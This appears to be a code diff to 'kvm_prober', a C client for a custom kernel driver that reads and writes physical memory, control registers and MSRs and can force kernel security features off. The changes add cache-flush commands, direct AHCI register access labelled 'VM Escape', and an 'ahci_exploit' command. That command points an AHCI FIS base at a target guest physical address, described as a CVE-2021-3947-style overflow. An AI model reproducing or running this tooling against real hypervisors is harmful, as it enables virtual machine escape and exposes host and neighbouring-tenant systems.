@@ -35,6 +35,7 @@
 #define IOCTL_GET_SVM_HANDLERS       (IOCTL_BASE + 0x06)
 #define IOCTL_SEARCH_SYMBOLS         (IOCTL_BASE + 0x07)
 #define IOCTL_GET_VMX_HANDLER_INFO   (IOCTL_BASE + 0x08)
+#define IOCTL_SEARCH_SYMBOLS_EXT     (IOCTL_BASE + 0x09)
 
 #define IOCTL_READ_KERNEL_MEM        (IOCTL_BASE + 0x10)
 #define IOCTL_READ_PHYSICAL_MEM      (IOCTL_BASE + 0x11)
@@ -78,11 +79,26 @@
 #define IOCTL_WALK_EPT               (IOCTL_BASE + 0x3E)
 #define IOCTL_TRANSLATE_GVA          (IOCTL_BASE + 0x3F)
 
+/* Cache Operations */
+#define IOCTL_WBINVD                 (IOCTL_BASE + 0x40)
+#define IOCTL_CLFLUSH                (IOCTL_BASE + 0x41)
+#define IOCTL_WRITE_AND_FLUSH        (IOCTL_BASE + 0x42)
+
+/* AHCI Direct Access */
+#define IOCTL_AHCI_INIT              (IOCTL_BASE + 0x50)
+#define IOCTL_AHCI_READ_REG          (IOCTL_BASE + 0x51)
+#define IOCTL_AHCI_WRITE_REG         (IOCTL_BASE + 0x52)
+#define IOCTL_AHCI_SET_FIS_BASE      (IOCTL_BASE + 0x53)
+#define IOCTL_AHCI_INFO              (IOCTL_BASE + 0x54)
+
 #define IOCTL_HYPERCALL              (IOCTL_BASE + 0x60)
 #define IOCTL_HYPERCALL_BATCH        (IOCTL_BASE + 0x61)
 
 #define IOCTL_SET_AUTO_SECURITY      (IOCTL_BASE + 0x70)
 #define IOCTL_FORCE_DISABLE_SECURITY (IOCTL_BASE + 0x71)
+
+/* Function prototypes */
+void read_cr_register(int cr_num);
 
 /* Data Structures */
 struct symbol_request {
@@ -135,6 +151,13 @@ struct mem_pattern {
 struct scan_request {
     struct mem_region region;
     struct mem_pattern pattern;
+};
+
+struct symbol_search_request {
+    char pattern[MAX_SYMBOL_NAME];
+    struct symbol_request *results;
+    int max_results;
+    int actual_count;
 };
 
 struct pattern_search_request {
@@ -303,6 +326,40 @@ struct gva_translate_request {
     int status;
 };
 
+
+struct clflush_request {
+    uint64_t virt_addr;
+    uint64_t phys_addr;
+    int use_phys;
+};
+
+struct write_flush_request {
+    uint64_t phys_addr;
+    uint64_t buffer;
+    size_t size;
+};
+
+struct ahci_info {
+    uint32_t cap;
+    uint32_t ghc;
+    uint32_t pi;
+    uint32_t vs;
+    uint32_t port_ssts[6];
+};
+
+struct ahci_reg_request {
+    int port;
+    uint32_t offset;
+    uint32_t value;
+    int is_write;
+};
+
+struct ahci_fis_request {
+    int port;
+    uint64_t fis_base;
+    uint64_t clb_base;
+};
+
 struct hypercall_request {
     unsigned long nr;
     unsigned long a0;
@@ -382,7 +439,26 @@ int init_driver(void) {
  * Security Control - FIXED
  * ======================================================================== */
 
-void force_disable_security(void) {
+void read_cr_register(int cr_num) {
+    struct cr_register_request req = { .cr_num = cr_num, .value = 0 };
+    if (ioctl(fd, IOCTL_READ_CR_REGISTER, &req) < 0) {
+        perror("[-] read CR failed");
+        return;
+    }
+    printf("[+] CR%d = 0x%lx\n", cr_num, req.value);
+    
+    if (cr_num == 0) {
+        printf("    WP (16): %s\n", (req.value & (1UL<<16)) ? "ENABLED" : "DISABLED");
+        printf("    PG (31): %s\n", (req.value & (1UL<<31)) ? "ENABLED" : "DISABLED");
+    } else if (cr_num == 3) {
+        printf("    PML4 phys: 0x%lx\n", req.value & ~0xFFFUL);
+    } else if (cr_num == 4) {
+        printf("    SMEP (20): %s\n", (req.value & (1UL<<20)) ? "ENABLED" : "DISABLED");
+        printf("    SMAP (21): %s\n", (req.value & (1UL<<21)) ? "ENABLED" : "DISABLED");
+    }
+}
+
+ void force_disable_security(void) {
     printf("[!] Forcing security features OFF in kernel...\n");
     
     if (ioctl(fd, IOCTL_FORCE_DISABLE_SECURITY, 0) < 0) {
@@ -574,22 +650,48 @@ void lookup_symbol(const char *name) {
     }
     
     /* Also search for partial matches */
+    /* First get count */
     int count = ioctl(fd, IOCTL_SEARCH_SYMBOLS, (void *)name);
+    
     if (count > 0) {
         if (count > 16) count = 16;
         
-        /* Temporarily store results by reading them */
-        char pattern[MAX_SYMBOL_NAME];
-        strncpy(pattern, name, MAX_SYMBOL_NAME - 1);
+        /* Actually retrieve the results */
+        /* We need to pass a request structure that can hold multiple results */
+        struct {
+            char pattern[MAX_SYMBOL_NAME];
+            struct symbol_request results[16];
+            int max_results;
+            int actual_count;
+        } search_req;
         
-        if (found_count > 0) {
-            printf("\n[+] PARTIAL MATCHES (%d):\n", count - 1);
+        strncpy(search_req.pattern, name, MAX_SYMBOL_NAME - 1);
+        search_req.max_results = 16;
+        search_req.actual_count = 0;
+        
+        /* Use the SEARCH_SYMBOLS ioctl with the extended structure */
+        if (ioctl(fd, IOCTL_SEARCH_SYMBOLS, &search_req) >= 0) {
+            if (found_count > 0) {
+                printf("\n[+] PARTIAL MATCHES (%d):\n", search_req.actual_count - 1);
+                /* Skip the first one if it's the exact match we already printed */
+                i = 1;
+            } else {
+                printf("[+] PARTIAL MATCHES (%d):\n", search_req.actual_count);
+                i = 0;
+            }
+            
+            for (; i < search_req.actual_count && i < 16; i++) {
+                printf("  [%d] %-40s @ 0x%lx\n", i, 
+                       search_req.results[i].name, 
+                       search_req.results[i].address);
+                if (search_req.results[i].description[0]) {
+                    printf("       %s\n", search_req.results[i].description);
+                }
+            }
         } else {
-            printf("[+] PARTIAL MATCHES (%d):\n", count);
+            printf("[*] Found %d matches, but couldn't retrieve details\n", count);
+            printf("    Run 'search %s' to see all partial matches\n", name);
         }
-        
-        /* Note: In real implementation, we'd need to properly retrieve these */
-        printf("    Run 'search %s' to see all partial matches\n", name);
     }
     
     if (found_count == 0 && count <= 0) {
@@ -623,17 +725,37 @@ void list_symbols(int max_count) {
 }
 
 void search_symbols(const char *pattern) {
+    /* Simple implementation using the existing SEARCH_SYMBOLS ioctl */
+    struct symbol_search_request req;
     struct symbol_request results[16];
-    int count = ioctl(fd, IOCTL_SEARCH_SYMBOLS, (void *)pattern);
-    if (count <= 0) {
-        printf("[-] No symbols match '%s'\n", pattern);
+    
+    strncpy(req.pattern, pattern, MAX_SYMBOL_NAME - 1);
+    req.results = results;
+    req.max_results = 16;
+    req.actual_count = 0;
+    
+    if (ioctl(fd, IOCTL_SEARCH_SYMBOLS_EXT, &req) < 0) {
+        /* Fall back to the old method */
+        int count = ioctl(fd, IOCTL_SEARCH_SYMBOLS, (void *)pattern);
+        if (count <= 0) {
+            printf("[-] No symbols match '%s'\n", pattern);
+            return;
+        }
+        printf("[+] Found %d symbols matching '%s' (use 'lookup' for details)\n", count, pattern);
         return;
     }
-    if (read(fd, results, sizeof(results)) > 0) {
-        printf("[+] Found %d symbols matching '%s':\n", count, pattern);
-        for (int i = 0; i < count && i < 16; i++) {
-            printf("  [%d] %-40s @ 0x%lx\n", i, results[i].name, results[i].address);
+    
+    if (req.actual_count > 0) {
+        printf("[+] Found %d symbols matching '%s':\n", req.actual_count, pattern);
+        for (int i = 0; i < req.actual_count && i < 16; i++) {
+            printf("  [%d] %-40s @ 0x%lx", i, results[i].name, results[i].address);
+            if (results[i].description[0]) {
+                printf(" - %s", results[i].description);
+            }
+            printf("\n");
         }
+    } else {
+        printf("[-] No symbols match '%s'\n", pattern);
     }
 }
 
@@ -782,29 +904,52 @@ void scan_unmapped_for_data(unsigned long start, unsigned long end) {
         printf("    %-18s %s\n", "Address", "Notes");
         printf("    %-18s %s\n", "-------", "-----");
         
+        unsigned long prev_addr = 0;
+        int in_gap = 0;
+        
         for (int i = 0; i < found && i < max_results; i++) {
             unsigned long addr = results[i];
             
-            /* Check if this is a gap between known regions */
-            int in_gap = 0;
-            if (i == 0 || (i > 0 && (addr - results[i-1]) > 0x100000)) {
-                /* New region or significant gap */
-                if (i > 0) printf("\n");
+            /* Check if this is in a large gap from previous */
+            if (i == 0) {
+                printf("\n[Region 1]\n");
                 printf("    0x%016lx  <-- Data found\n", addr);
-            } else if ((addr - results[i-1]) <= 0x10000) {
-                /* Close to previous, likely same region */
+                in_gap = 0;
+            } else if ((addr - prev_addr) > 0x100000) {
+                /* New region - significant gap */
+                printf("\n[Region %d] Gap: 0x%lx bytes\n", 
+                       (i/100) + 2, addr - prev_addr);
                 printf("    0x%016lx\n", addr);
+                in_gap = 0;
+            } else if ((addr - prev_addr) > 0x1000 && !in_gap) {
+                /* Small gap within region */
+                printf("    ... gap: 0x%lx ...\n", addr - prev_addr);
+                printf("    0x%016lx\n", addr);
+                in_gap = 1;
             } else {
+                /* Close to previous */
                 printf("    0x%016lx\n", addr);
+                in_gap = 0;
             }
+            
+            prev_addr = addr;
         }
         
         if (found >= max_results) {
             printf("\n[!] Maximum results (%d) reached, scan incomplete\n", max_results);
         }
         
-        printf("\n[*] Scan complete. Read these addresses to see actual data:\n");
-        printf("    sudo ./kvm_prober read_phys <addr> 0x100\n");
+        printf("\n[*] Scan complete. Found %d data locations.\n", found);
+        printf("    To read these addresses: sudo ./kvm_prober read_phys <addr> 0x100\n");
+        
+        /* Let user quickly read the first few */
+        if (found > 0) {
+            printf("\n[*] Quick read of first 3 locations:\n");
+            for (int i = 0; i < 3 && i < found; i++) {
+                printf("\n--- Address 0x%lx ---\n", results[i]);
+                read_physical_mem(results[i], 0x40);  /* Read 64 bytes */
+            }
+        }
         
     } else if (found == 0) {
         printf("[-] No non-zero data found in unmapped regions\n");
@@ -920,25 +1065,6 @@ void find_pattern(unsigned long start, unsigned long end, const char *pattern_he
         printf("[-] Pattern not found\n");
     } else {
         printf("[+] Found at 0x%lx\n", req.found_addr);
-    }
-}
-
-void read_cr_register(int cr_num) {
-    struct cr_register_request req = { .cr_num = cr_num, .value = 0 };
-    if (ioctl(fd, IOCTL_READ_CR_REGISTER, &req) < 0) {
-        perror("[-] read CR failed");
-        return;
-    }
-    printf("[+] CR%d = 0x%lx\n", cr_num, req.value);
-    
-    if (cr_num == 0) {
-        printf("    WP (16): %s\n", (req.value & (1UL<<16)) ? "ENABLED" : "DISABLED");
-        printf("    PG (31): %s\n", (req.value & (1UL<<31)) ? "ENABLED" : "DISABLED");
-    } else if (cr_num == 3) {
-        printf("    PML4 phys: 0x%lx\n", req.value & ~0xFFFUL);
-    } else if (cr_num == 4) {
-        printf("    SMEP (20): %s\n", (req.value & (1UL<<20)) ? "ENABLED" : "DISABLED");
-        printf("    SMAP (21): %s\n", (req.value & (1UL<<21)) ? "ENABLED" : "DISABLED");
     }
 }
 
@@ -1321,6 +1447,18 @@ void print_help(void) {
     printf("  ept_walk <eptp> <gpa>   gva2gpa <gva> <cr3>\n");
     printf("  addrinfo <addr>\n\n");
     
+    printf("CACHE OPERATIONS:\n");
+    printf("  wbinvd                       - Flush ALL caches on ALL CPUs\n");
+    printf("  clflush <addr>               - Flush cache line for address\n");
+    printf("  write_flush <phys> <hex>     - Write + flush cache + WBINVD\n\n");
+    
+    printf("AHCI OPERATIONS (VM Escape):\n");
+    printf("  ahci_info                    - Show AHCI controller info\n");
+    printf("  ahci_read <port> <offset>    - Read AHCI port register\n");
+    printf("  ahci_write <port> <off> <val>- Write AHCI port register\n");
+    printf("  ahci_set_fb <port> <phys>    - Set FIS base (for CVE-2021-3947)\n");
+    printf("  ahci_exploit <target_gpa>    - Attempt FIS overflow exploit\n\n");
+
     printf("REGISTER OPERATIONS:\n");
     printf("  cr <num>                 msr <num>\n");
     printf("  write_msr <msr> <val>    write_cr <num> <val> [mask]\n");
@@ -1443,7 +1581,181 @@ int main(int argc, char *argv[]) {
     else if (strcmp(cmd, "kaslr") == 0) get_kaslr_info();
     else if (strcmp(cmd, "critical") == 0) dump_critical_regions();
     
-    else { printf("[-] Unknown command: %s\n", cmd); print_help(); }
+    /* Cache operations */
+    else if (strcmp(cmd, "wbinvd") == 0) {
+        printf("[*] Executing WBINVD on all CPUs...\n");
+        if (ioctl(fd, IOCTL_WBINVD, NULL) == 0) {
+            printf("[+] WBINVD complete\n");
+        } else {
+            perror("[-] WBINVD failed");
+        }
+    }
+    else if (strcmp(cmd, "clflush") == 0 && argc > 2) {
+        struct clflush_request req = {0};
+        uint64_t addr = strtoull(argv[2], NULL, 0);
+        
+        /* If address looks like a physical address (no 0xffff prefix) */
+        if (addr < 0xffff000000000000ULL) {
+            req.phys_addr = addr;
+            req.use_phys = 1;
+        } else {
+            req.virt_addr = addr;
+            req.use_phys = 0;
+        }
+        
+        printf("[*] Flushing cache for address 0x%lx...\n", addr);
+        if (ioctl(fd, IOCTL_CLFLUSH, &req) == 0) {
+            printf("[+] CLFLUSH complete\n");
+        } else {
+            perror("[-] CLFLUSH failed");
+        }
+    }
+    else if (strcmp(cmd, "write_flush") == 0 && argc > 3) {
+        struct write_flush_request req;
+        unsigned char data[512];
+        int len = parse_hex_pattern(argv[3], data, sizeof(data));
+        
+        if (len <= 0) {
+            printf("[-] Invalid hex data\n");
+        } else {
+            req.phys_addr = strtoull(argv[2], NULL, 0);
+            req.buffer = (uint64_t)data;
+            req.size = len;
+            
+            printf("[*] Writing %d bytes to phys 0x%lx with cache flush...\n", 
+                   len, req.phys_addr);
+            
+            if (ioctl(fd, IOCTL_WRITE_AND_FLUSH, &req) == 0) {
+                printf("[+] Write + flush complete\n");
+            } else {
+                perror("[-] Write + flush failed");
+            }
+        }
+    }
+    
+    /* AHCI operations */
+    else if (strcmp(cmd, "ahci_info") == 0) {
+        struct ahci_info info;
+        
+        printf("[*] Getting AHCI info via kernel driver...\n");
+        if (ioctl(fd, IOCTL_AHCI_INFO, &info) == 0) {
+            printf("[+] AHCI Controller Info:\n");
+            printf("    CAP:  0x%08x (ports: %d, slots: %d)\n", 
+                   info.cap, (info.cap & 0x1f) + 1, ((info.cap >> 8) & 0x1f) + 1);
+            printf("    GHC:  0x%08x\n", info.ghc);
+            printf("    PI:   0x%08x\n", info.pi);
+            printf("    VS:   %d.%d\n", (info.vs >> 16), info.vs & 0xffff);
+            printf("\n    Port Status:\n");
+            for (int i = 0; i < 6; i++) {
+                if (info.pi & (1 << i)) {
+                    printf("      Port %d: SSTS=0x%08x (DET=%d)\n", 
+                           i, info.port_ssts[i], info.port_ssts[i] & 0xf);
+                    if ((info.port_ssts[i] & 0xf) == 3) {
+                        printf("              -> Device present!\n");
+                    }
+                }
+            }
+        } else {
+            perror("[-] AHCI info failed");
+        }
+    }
+    else if (strcmp(cmd, "ahci_read") == 0 && argc > 3) {
+        struct ahci_reg_request req = {0};
+        req.port = strtoul(argv[2], NULL, 0);
+        req.offset = strtoul(argv[3], NULL, 0);
+        
+        if (ioctl(fd, IOCTL_AHCI_READ_REG, &req) == 0) {
+            printf("[+] AHCI port %d offset 0x%x = 0x%08x\n", 
+                   req.port, req.offset, req.value);
+        } else {
+            perror("[-] AHCI read failed");
+        }
+    }
+    else if (strcmp(cmd, "ahci_write") == 0 && argc > 4) {
+        struct ahci_reg_request req = {0};
+        req.port = strtoul(argv[2], NULL, 0);
+        req.offset = strtoul(argv[3], NULL, 0);
+        req.value = strtoul(argv[4], NULL, 0);
+        req.is_write = 1;
+        
+        printf("[*] Writing AHCI port %d offset 0x%x = 0x%08x\n", 
+               req.port, req.offset, req.value);
+        if (ioctl(fd, IOCTL_AHCI_WRITE_REG, &req) == 0) {
+            printf("[+] Write successful\n");
+        } else {
+            perror("[-] AHCI write failed");
+        }
+    }
+    else if (strcmp(cmd, "ahci_set_fb") == 0 && argc > 3) {
+        struct ahci_fis_request req = {0};
+        req.port = strtoul(argv[2], NULL, 0);
+        req.fis_base = strtoull(argv[3], NULL, 0);
+        if (argc > 4) {
+            req.clb_base = strtoull(argv[4], NULL, 0);
+        }
+        
+        printf("[*] Setting AHCI port %d FIS base to 0x%lx\n", req.port, req.fis_base);
+        if (ioctl(fd, IOCTL_AHCI_SET_FIS_BASE, &req) == 0) {
+            printf("[+] FIS base set successfully\n");
+        } else {
+            perror("[-] Set FIS base failed");
+        }
+    }
+    else if (strcmp(cmd, "ahci_exploit") == 0 && argc > 2) {
+        /* CVE-2021-3947 style exploit attempt */
+        uint64_t target_gpa = strtoull(argv[2], NULL, 0);
+        struct ahci_info info;
+        int port = -1;
+        
+        printf("[*] AHCI FIS Overflow Exploit\n");
+        printf("[*] Target GPA: 0x%lx\n", target_gpa);
+        
+        /* Get AHCI info */
+        if (ioctl(fd, IOCTL_AHCI_INFO, &info) < 0) {
+            perror("[-] Failed to get AHCI info");
+            goto ahci_exploit_done;
+        }
+        
+        /* Find a port with device */
+        for (int i = 0; i < 6; i++) {
+            if ((info.pi & (1 << i)) && ((info.port_ssts[i] & 0xf) == 3)) {
+                port = i;
+                break;
+            }
+        }
+        
+        if (port < 0) {
+            printf("[-] No AHCI port with device found\n");
+            goto ahci_exploit_done;
+        }
+        
+        printf("[+] Using port %d\n", port);
+        
+        /* The exploit: Set FIS base so that D2H FIS lands on target */
+        /* D2H FIS is at offset 0x40 in the receive FIS structure */
+        uint64_t malicious_fb = target_gpa - 0x40;
+        
+        printf("[*] Setting malicious FIS base: 0x%lx\n", malicious_fb);
+        
+        struct ahci_fis_request fis_req = {
+            .port = port,
+            .fis_base = malicious_fb,
+            .clb_base = 0
+        };
+        
+        if (ioctl(fd, IOCTL_AHCI_SET_FIS_BASE, &fis_req) < 0) {
+            perror("[-] Failed to set FIS base");
+            goto ahci_exploit_done;
+        }
+        
+        printf("[+] FIS base set. Device activity should trigger FIS writes.\n");
+        printf("[*] Check hypercall 100 now!\n");
+        
+ahci_exploit_done:
+        ;
+    }
+    
+    else { printf("[-] Unknown command or missing args: %s\n", cmd); print_help(); }
     
     close(fd);
     return 0;
